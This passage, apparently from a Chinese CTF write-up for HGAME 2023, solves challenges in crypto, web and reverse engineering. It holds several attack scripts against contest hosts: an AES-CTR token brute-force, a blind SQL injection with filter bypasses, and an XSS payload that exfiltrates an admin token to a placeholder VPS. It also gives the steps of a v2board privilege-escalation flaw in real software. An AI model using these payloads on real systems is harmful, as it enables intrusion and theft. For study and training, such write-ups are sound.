c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userName := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> userName == <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;兔兔才不可能是你呢！！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: <span class="string">&quot;230555433&quot;</span>&#125;</span><br><span class="line">jsonUser, _ := json.Marshal(User)</span><br><span class="line">token, _ := util.Encrypt(<span class="type">string</span>(jsonUser))</span><br><span class="line">c.SetCookie(<span class="string">&quot;token&quot;</span>, token, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">buyController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">method := c.Request.Method</span><br><span class="line">token, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;没有身份的人可不能来这儿买东西。&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">jsonUser, err := util.Decrypt(token)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">User := user.User&#123;&#125;</span><br><span class="line">err = json.Unmarshal([]<span class="type">byte</span>(jsonUser), &amp;User)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">name := User.Name</span><br><span class="line"><span class="keyword">if</span> method != http.MethodGet &#123;</span><br><span class="line">c.String(http.StatusMethodNotAllowed, fmt.Sprintf(<span class="string">&quot;your method: %s. but only get method allowed&quot;</span>, method))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">product := c.Query(<span class="string">&quot;prod&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> product == <span class="string">&quot;flag&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> name != <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;flag 可是特地为兔兔准备的！&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">file, _ := os.Open(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">flag, _ := io.ReadAll(file)</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully\n%s&quot;</span>, name, product, flag))</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully&quot;</span>, name, product))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要token里userName值为 <code>Vidar-Tu</code>，但不能直接输入 <code>Vidar-Tu</code>。</p><p>查看 <code>util/util.go</code> 里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">var</span> iv = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">_, _ = rand.Read(key)</span><br><span class="line">_, _ = rand.Read(iv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encrypt</span><span class="params">(u <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line">plainText := []<span class="type">byte</span>(u)</span><br><span class="line">blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">cipherText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(plainText))</span><br><span class="line">blockMode.XORKeyStream(cipherText, plainText)</span><br><span class="line"><span class="keyword">return</span> base64.StdEncoding.EncodeToString(cipherText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(cipherText <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">decodeData, err := base64.StdEncoding.DecodeString(cipherText)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;invalid base64&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line">blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">plainText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(decodeData))</span><br><span class="line">blockMode.XORKeyStream(plainText, decodeData)</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(plainText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token的使用AES-CTR模式加密生成，而在CTR模式中， 有一个自增的算子（IV，后四个字节相当于计数器，每次计算递增），这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密，即 $m \oplus \text{keystream} = c$。</p><p>用户名和token为一一对应关系，输入 <code>Vidar-Tv</code> 和 <code>Vidar-Tw</code> 获取对应token的base64字符串，找到改变的字符，爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">    token = <span class="string">f&#x27;NnL3arZc7tt+ezcky+B8fF<span class="subst">&#123;k&#125;</span>75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27;</span></span><br><span class="line">    r = s.get(url, cookies=&#123;<span class="string">&#x27;token&#x27;</span>:quote(token)&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Vidar-Tu&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(k,quote(token),r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully</span></span><br></pre></td></tr></table></figure><p>修改cookie中的token，购买flag，得到flag：<code>hgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;</code>。</p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><blockquote><p>电视剧里的黑客?真正的黑客！</p></blockquote><p>题目即提示，git泄露。</p><p>访问 <code>http://HOST:PORT/.git/</code>，使用wget下载git目录：</p><p><code>wget -r http://week-2.hgame.lwsec.cn:31765/.git/</code></p><p>进入 <code>.git/logs</code>，使用 <code>git reflog</code> 查看所有分支的所有操作记录（包括已经被删除的 commit 记录和 reset 的操作）；</p><p>选择需要查看的记录，<code>git show 1dd69e2</code> 拿到flag：<code>hgame&#123;Don&#39;t^put*Git-in_web_directory&#125;</code>。</p><p>​    </p><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><blockquote><p>请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。</p></blockquote><p>v2board存在越权漏洞，参考<a href="https://www.ctfiot.com/88960.html">v2board越权漏洞复现</a>。</p><p>首先注册一个普通用户账号，然后通过 <code>http://HOST:PORT/api/v1/passport/auth/login</code> 接口登录该账号，会返回一个 <code>auth_data</code> 值；</p><p>然后访问 <code>http://HOST:PORT/api/v1/user/login</code> 接口，并将上述获得的 <code>auth_data</code> 作为authorization头发送，让服务器将普通用户的Authorization头写入缓存中；</p><p>最后只要带上这个Authorization头即可访问所有的管理员接口。</p><p>访问 <code>http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1</code>，得到flag：<code>hgame&#123;39d580e71705f6abac9a414def74c466&#125;</code>。</p><p>​    </p><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><blockquote><p>R1esbyfe给兔兔写了一个简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货）</p><p>R1esbyfe:”面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码”</p><p>貌似R1esbyfe还藏了点惊喜，你能帮助兔兔找到它吗？</p><p>(数据库启动需要时间，若出现Internal Error，需要稍等片刻)</p><p>HINTS:</p><p>密码是弱密码，可以自己找个dict爆破一下</p></blockquote><p>根据hint猜密码 <code>admin123</code>，sql注入，fuzz发现过滤了空格、select、database、or、等号、大小于号等关键字。关键字改大写，等号改 <code>regexp</code> 绕过。</p><p>布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits+string.ascii_letters+<span class="string">&#x27;&#123;&#125;-_?!,&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;</span></span><br><span class="line">now = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(DATABASE())&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27;</span></span><br><span class="line">        sql = <span class="string">&#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;))&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">        cookie = &#123;<span class="string">&#x27;SESSION&#x27;</span>:<span class="string">&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;</span>&#125;</span><br><span class="line">        r = s.post(url,data=data,cookies=cookie)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            now += j</span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># database: se4rch</span></span><br><span class="line"><span class="comment"># table: 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># column: f14gggg1shere</span></span><br><span class="line"><span class="comment"># 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</code>。</p><p>​    </p><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><blockquote><p>Come and design your button</p></blockquote><p>在 <code>index.js</code> 中 <code>/button/share</code> 路由会调用 <code>/button/preview</code> 路由：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>测试发现 <code>/button/preview</code> 路由存在XSS注入，尝试XSS请求伪造：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;));</span><br><span class="line">url=<span class="string">&quot;http://VPS-IP/x.php?token=&quot;</span>+<span class="title class_">String</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line"><span class="keyword">var</span> xhr2=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr2.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">xhr2.<span class="title function_">send</span>(<span class="string">&quot;token&quot;</span>);</span><br></pre></td></tr></table></figure><p>admin点击后，生成正确token，发送到VPS的apache日志中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot;</span><br></pre></td></tr></table></figure><p>解析jwt，得到flag：<code>hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>在 <code>sub_558AEC339229()</code> 中使用 <code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code>  机制将base64码表修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_558AEC339229</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;qword_558AEC33C020, <span class="string">&quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x636D79474568756A</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再解码即可，flag：<code>hgame&#123;s0meth1ng_run_befOre_m@in&#125;</code>。</p><p>​    </p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><blockquote><p>兔兔假期前学习了编程，你能看出来他学的是什么语言吗</p></blockquote><p>python程序逆向，使用pyinstxtractor将exe解包得到 <code>stream.pyc</code> 文件，再用uncompyle6反编译，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: stream.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">            tmp = s[i]</span><br><span class="line">            s[i] = s[j]</span><br><span class="line">            s[j] = tmp</span><br><span class="line">            data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(text, gen(key)):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line">        result = base64.b64encode(result.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;Flag: &#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = encrypt(text, key)</span><br><span class="line"><span class="keyword">if</span> enc == <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">None</span>(<span class="string">&#x27;try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>识别为RC4加密算法，cyberchef解出flag：<code>hgame&#123;python_reverse_is_easy_with_internet&#125;</code>。</p><p>​    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>由于兔兔的学校提前放假，开学才能期末考试，于是兔兔开始了他的寒假期末复习~</p></blockquote><p>实际为解非齐次线性方程组，矩阵乘法逆运算，这里使用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [<span class="number">126</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">216</span>, <span class="number">253</span>, <span 